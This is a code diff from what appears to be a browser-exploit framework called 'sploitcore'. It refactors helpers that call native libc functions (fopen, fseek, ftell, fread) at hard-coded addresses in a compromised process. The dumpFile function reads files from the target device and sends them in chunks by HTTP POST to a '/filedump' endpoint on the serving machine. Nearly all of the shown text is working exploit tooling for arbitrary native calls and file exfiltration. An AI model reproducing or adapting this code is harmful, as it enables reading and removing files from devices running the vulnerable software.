@@ -616,46 +616,38 @@ sploitcore.prototype.str2buf = function(str) {
 	}
 
 	return buf;
-
-}
+};
 
 sploitcore.prototype.getFileSize = function(fhandle) {
-	var fseek = 0x438B18;
-	var ftell = 0x438BE0;
+	var fseek = this.bridge(0x438B18, null, void_p, int, int);
+	var ftell = this.bridge(0x438BE0, int);
 
-	this.call(fseek, [fhandle, [0, 0], [2, 0]]);
-	var fsize = this.call(ftell, [fhandle]);
-	this.call(fseek, [fhandle, [0, 0], [0, 0]]);
+	fseek(fhandle, 0, 2);
+	var fsize = ftell(fhandle);
+	fseek(fhandle, 0, 0);
 
-	return fsize;       
-}
+	return fsize;
+};
 
 sploitcore.prototype.dumpFile = function(fn) {
-	var native_malloc = 0x1E8;
-	var native_free = 0x210;
-	var fopen = 0x43DDB4;
-	var fseek = 0x438B18;
-	var ftell = 0x438BE0;
-	var fread = 0x438A14;
+	var fopen = this.bridge(0x43DDB4, void_p, char_p, char_p);
+	var fread = this.bridge(0x438A14, int, void_p, int, int, void_p);
 
-	var namebuf = this.str2buf(fn);
-	var modebuf = this.str2buf('r');
-
-	var fhandle = this.call(fopen, [namebuf, modebuf]);
-	if (fhandle[0] != 0 || fhandle[1] != 0) {
+	var fhandle = fopen(fn, 'r');
+	if (!nullptr(fhandle)) {
 		var fsize = this.getFileSize(fhandle);
 		var ofs = 0;
 		var arr = new ArrayBuffer(0x800000);
 		var int8view = new Uint8Array(arr);
 		var outbuf = this.read8(this.getAddr(int8view), 4);
-		var sz = fsize[0];
+		var sz = fsize[0]; // XXX: Add primitive for converting our double-uint32 arrays into numbers
 		while (sz > 0) {
 			if (sz < 0x800000) {
 				arr = new ArrayBuffer(sz);
 				int8view = new Uint8Array(arr);
 				outbuf = this.read8(this.getAddr(int8view), 4);
 			}
-			this.call(fread, [outbuf, [0x1, 0], [sz < 0x800000 ? sz : 0x800000, 0], fhandle]);
+			fread(outbuf, 1, sz < 0x800000 ? sz : 0x800000, fhandle);
 			var xhr = new XMLHttpRequest();
 			xhr.open('POST', '/filedump', false);
 			xhr.setRequestHeader('Content-Type', 'application/octet-stream');
@@ -668,10 +660,7 @@ sploitcore.prototype.dumpFile = function(fn) {
 	} else {
 		log('Failed to open file '+ fn + '!');
 	}
-
-	this.free(namebuf);
-	this.free(modebuf);
-}
+};
 
 sploitcore.prototype.bridge = function(ptr, rettype) {
 	if(typeof(ptr) == 'number')
